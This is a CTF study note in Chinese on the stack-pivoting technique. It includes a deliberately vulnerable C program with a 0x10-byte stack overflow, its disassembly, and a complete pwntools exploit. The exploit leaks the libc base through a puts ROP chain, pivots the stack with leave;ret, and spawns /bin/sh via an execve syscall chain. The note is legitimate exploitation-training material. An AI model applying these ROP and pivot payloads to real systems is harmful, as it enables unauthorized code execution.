---
tags:
  - 2026/9/29
  - pwn
  - CTF
---
[hello-cof此题目地址](https://hello-ctf.com/hc-pwn/ROP_Tricks/)

> 在另一个区域构造好 payload，如 ROP 链，然后将栈迁移过去执行 ROP 链

有一点难以理解，不过最后还是发现了学习的方法：在开头使用`gdb.attach(p)`调试，每次`p.send`注入后都使用`input`暂时停止，使用gdb逐汇编分析、检查寄存器。检查完毕后放行，等待下一次注入后`input`

[hello-ctf.com](https://hello-ctf.com) 中的题目在最新版GCC中因为代码优化而无法使用（缺少`pop rdi; ret`），因此这里我手动加了
```C
// gcc a.c -no-pie -fno-stack-protector
#include <stdio.h>
#include <unistd.h>

char buf[0x1000];

int poprdi() {  __asm__("pop %rdi; ret");  }

int main() {
    char str[0x20];
    puts("Read 1");

    read(0, buf, 0x1000);

    puts("Read 2");

    read(0, str, 0x30);

    return 0;
}

```

[[asm汇编指令(x86)#leave]]、[[asm汇编指令(x86)#ret]]，`leave; ret`相当于`mov rsp, rbp; pop rbp; pop rip`，因此使我们可以控制栈底rbp（pop rbp），进而间接控制栈顶rsp（函数顶部`mov rbp, rsp; sub rsp 0x20`）  
  
下面是`radare2`的反汇编
```radare2
;-- main:
0x0040113f      55             push rbp
0x00401140      4889e5         mov rbp, rsp
0x00401143      4883ec20       sub rsp, 0x20
0x00401147      488d05b60e..   lea rax, str.Read_1         ; 0x402004 ; "Read 1"
0x0040114e      4889c7         mov rdi, rax
0x00401151      e8dafeffff     call sym.imp.puts           ;[1]
0x00401156      488d05e32e..   lea rax, obj.buf            ; 0x404040
0x0040115d      ba00100000     mov edx, 0x1000
0x00401162      4889c6         mov rsi, rax
0x00401165      bf00000000     mov edi, 0
0x0040116a      e8d1feffff     call sym.imp.read           ;[2]
0x0040116f      488d05950e..   lea rax, str.Read_2         ; 0x40200b ; "Read 2"
0x00401176      4889c7         mov rdi, rax
0x00401179      e8b2feffff     call sym.imp.puts           ;[1]
0x0040117e      488d45e0       lea rax, [rbp - 0x20]
0x00401182      ba30000000     mov edx, 0x30               ; '0' ; 48
0x00401187      4889c6         mov rsi, rax
0x0040118a      bf00000000     mov edi,0
0x0040118f      e8acfeffff     call sym.imp.read           ;[2]
0x00401194      b800000000     mov eax, 0
0x00401199      c9             leave
0x0040119a      c3             ret
0x0040119b  ~   004883         add byte [rax - 0x7d], cl  
```

下面对利用代码进行详解
```python
from pwn import *

context.arch = "amd64"

p    = process("./a.out")
elf  = ELF("./a.out")
libc = elf.libc

# 需要的gadget，需要使用ROPgadget获取，必需确保其正确
# 可以使用我放在此目录下的 lookfor.py ，封装了 ROPgadget 命令，方便同时查找多个gadget
### - 复现时记得修改此处的gedget！ - ###
pop_rdi   = 0x000000000040113a
leave_ret = 0x0000000000401199
ret       = 0x0000000000401016

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
main_addr = elf.sym["main"]

payload = flat({
    0xE00:[
        p64(0xdeadbeef),        # padding
        p64(pop_rdi),
        p64(puts_got),
        p64(puts_plt),
        p64(main_addr)
    ]
})
# 这里是第一次输入 Read 1，读取反汇编可以得知，这里的 read(0, 0x404040, 0x1000)
# 读取 0x1000 字节，放到 buf(0x404040) 处。这里把泄漏puts地址的代码放到
# buf+0xE00 处（上面的 flat 中的'0xE00'输出了 0xE00 字节的随机字符，把我们的
# gadget 放到 buf+0xE00 处）

p.sendafter(b'Read 1\n', payload)
gdb.attach(p)       # 打开gdb调试（开头就打开或许更好，省的次次关窗口了）
input('break 1')    # 使用input暂停，等待gdb调试完毕，换行放行

payload = flat({
    0x20: [
        p64(0x404E40),     # 覆盖栈底地址
        p64(leave_ret),    # 覆盖返回地址
    ]
})
# 第二次输入 Read 2，审查反汇编代码发现，read 给我们的注入点在栈上 rbp-0x20 ，但是
# 允许输入 0x30 字节，栈溢出了 0x10 字节，导致了保存的栈底和返回地址被覆盖
# 
# 这个注入中：
# - p64(0x404E40) 覆盖栈底地址为 0x404E40，即 0x404040+0xE00，即 buf+0xE00，
#                 这是我们上一次注入的rop链的地址，栈底rbp被跳到了这个地方，即
#                 rbp = 0x404E40
# - p64(leave_ret)覆盖返回地址为 gadget `leave; ret`的地址，使 leave; ret 被
#                 执行。leave; ret 相当于 `mov rsp, rbp; pop rbp; pop rip`
#                 mov rsp, rbp  ; 上面已经使 rbp = 0x404E40，这里使得
#                               ; rsp = rbp = 0x404E40，通过控制rbp间接修改rsp
#                 pop rbp       ; 弹出栈顶的地址作为栈底，因为rsp已经被上一条改变，
#                               ; 这里会弹出0xdeadbeef，因为rbp已经不需要了
#                 pop rip       ; 0xdeadbeef 被弹出，泄漏puts地址的ROP开始执行

p.sendafter(b"Read 2\n", payload)

gdb.attach(p)
input('break 2')    # 暂停，等待GDB调试

puts_addr = u64(p.recv(6).ljust(8, b"\x00"))    # 获取puts地址
log.success("puts_addr: " + hex(puts_addr))
libc_base = puts_addr - libc.sym["puts"]        # 计算libc基地址
log.success("libc_base: " + hex(libc_base))
'''
# hello-ctf官方解法中喜欢使用system，而它在我的电脑上成功率不如系统调用高，所以这里
# 换成了使用系统调用实现
pop_rsi = libc_base + 0x000000000002baa9
binsh_addr  = libc_base + next(libc.search(b"/bin/sh"))
system_addr = libc_base + libc.sym["system"]

payload = flat({
    0x600: [
        p64(0xdeadbeef),        # padding
        p64(pop_rdi),
        p64(binsh_addr),
        p64(ret),
        p64(system_addr),
    ]
})
'''
pop_rax = libc_base + 0x0000000000043ee6
pop_rdi = libc_base + 0x000000000002aaf7
pop_rsi = libc_base + 0x0000000000029e69
pop_rdx_rbx = libc_base + 0x0000000000091665
syscall = libc_base + 0x0000000000028560
binsh   = next(libc.search('/bin/sh')) + libc_base
# search str'/bin/sh' addr in libc

payload = b'a' * 0x600     + \
          p64(0xbeadbeef)  + \
          p64(pop_rax)     + \
          p64(59)          + \
          p64(pop_rdi)     + \
          p64(binsh)       + \
          p64(pop_rsi)     + \
          p64(0)           + \
          p64(pop_rdx_rbx) + \
          p64(0) + p64(0)  + \
          p64(syscall)
          # execve("/bin/sh", 0, 0)
          # execve的系统调用号为59
# 在上面的第一次 Read 1 注入中，我们在末尾再次调用了 main，使 main 再次运行
# 这里是第二次 Read 1，我们终于可以使用 libc 中庞大的 gadget 构造ROP链了。这里使用
# 系统调用的方法 getshell，ROP链放在 buf+0x600 处，即 0x404640



p.sendafter(b"Read 1\n", payload)
gdb.attach(p)
input('break 3')    # 第三次停下来，等待调试

payload = flat({
    0x20: [
        p64(0x404640),
        p64(leave_ret),
    ]
})
# 最后一次 Read 2 注入，具体流程如上一次 Read 2 时注入一样，通过控制rbp间接控制rsp，
# 使 rsp 移动到我们上面构建的ROP链 0x404640 上 getshell

p.sendafter(b"Read 2\n", payload)
gdb.attach(p)
print('\033[31m\033[1m这里gdb将询问你(y/n), 一定要选择再叉掉gdb窗口，一定!!!!!!!!!!! :) 不然无法利用，不要问我为什么知道 :) !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\033[0m')
input('last break')    # 最后一次调试，记得按照上面的输出做，防止GDB一直占着程序使利用失败

p.interactive()
```